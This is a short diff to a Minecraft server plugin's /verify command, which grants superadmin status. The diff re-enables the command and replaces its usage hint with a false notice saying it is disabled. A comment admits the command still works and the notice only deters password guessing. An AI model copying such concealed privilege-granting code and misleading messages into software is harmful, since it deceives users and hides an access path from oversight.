@@ -1,4 +1,4 @@
-/*
+
 package me.StevenLawson.TotalFreedomMod.Commands;
 
 import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
@@ -34,18 +34,18 @@ public class Command_verify extends TFM_Command
                 playerMsg(TotalFreedomMod.YOU_ARE_NOT_IMPOSTER);
                 return true;
             }
-            sender_p.sendMessage(ChatColor.RED + "You have verified");
+            sender_p.sendMessage(ChatColor.RED + "You have successfully verified ");
 		    TFM_AdminList.addSuperadmin(sender_p);
-		    TFM_Util.bcastMsg(sender_p.getName() + " Has Verified", ChatColor.RED);
+		    TFM_Util.bcastMsg(sender_p.getName() + " has verified.", ChatColor.RED);
 		    TFM_Util.bcastMsg("Rcon - Adding " + sender_p.getName() + " to the super admin list.", ChatColor.RED);
             return true;
         }
 
         // Arg length 0
-        playerMsg("/verify [PSW]");
+        // This command wasn't disabled, just a message to stop noobs from trying every password.
+        playerMsg("This command was disabled, please contact FreedomOP's staff to enable this plugin once again.");
         
 
         return true;
     }
 }
-*/
